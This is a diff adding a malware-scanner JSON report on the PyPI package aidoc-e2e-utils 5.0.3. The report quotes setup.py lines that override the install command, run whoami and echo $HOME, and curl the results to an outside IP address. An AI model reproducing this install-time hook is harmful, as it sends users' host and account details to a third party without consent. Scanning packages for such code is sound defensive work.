@@ -1,0 +1,56 @@
+{
+    "issues": 7,
+    "errors": {},
+    "results": {
+        "exfiltrate-sensitive-data": {},
+        "dll-hijacking": {},
+        "exec-base64": {},
+        "download-executable": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:36",
+                "code": "setup(packages=setuptools.find_packages(),cmdclass={'install': CustomInstall})",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": [
+            {
+                "location": "setup.py:13",
+                "code": "   whoami=os.popen('whoami').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:14",
+                "code": "   home = os.popen(\"echo $HOME\").read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:15",
+                "code": "   os.popen(f\"curl -s http://3.221.152.203:8000/acl/package/{getFolderName()}/system/{system}/user/{whoami} > /dev/null 2>&1\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "   os.popen(f\"curl -s http://3.221.152.203:8000/acl/package/{getFolderName()}/home/{home} > /dev/null 2>&1\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "obfuscation": {},
+        "shady-links": [
+            {
+                "location": "setup.py:15",
+                "code": "   os.popen(f\"curl -s http://3.221.152.203:8000/acl/package/{getFolderName()}/system/{system}/user/{whoami} > /dev/null 2>&1\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "   os.popen(f\"curl -s http://3.221.152.203:8000/acl/package/{getFolderName()}/home/{home} > /dev/null 2>&1\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/aidoc-e2e-utils-5.0.3"
+}
